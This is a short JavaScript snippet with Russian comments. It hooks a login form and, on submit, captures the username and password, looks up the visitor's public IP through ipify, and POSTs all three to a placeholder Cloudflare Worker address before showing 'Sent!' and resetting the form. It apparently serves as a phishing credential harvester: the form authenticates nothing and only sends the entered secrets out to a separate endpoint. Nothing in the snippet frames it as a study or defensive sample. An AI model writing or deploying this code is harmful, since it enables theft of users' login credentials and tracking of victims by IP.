const WORKER_URL = 'https://<YOUR_WORKER_SUBDOMAIN>.workers.dev/';

document.getElementById('loginForm').addEventListener('submit', async e => {
  e.preventDefault();
  const form = e.target;
  const login   = form.login.value;
  const password= form.password.value;

  // 1) Сперва забираем реальный публичный IPv4
  let ip = 'unknown';
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const json= await res.json();
    ip = json.ip || ip;
  } catch(err) {
    console.warn('Cannot fetch IP:', err);
  }

  // 2) Шлём всё в Worker
  await fetch(WORKER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip, login, password })
  });

  alert('Sent!');  
  form.reset();
});
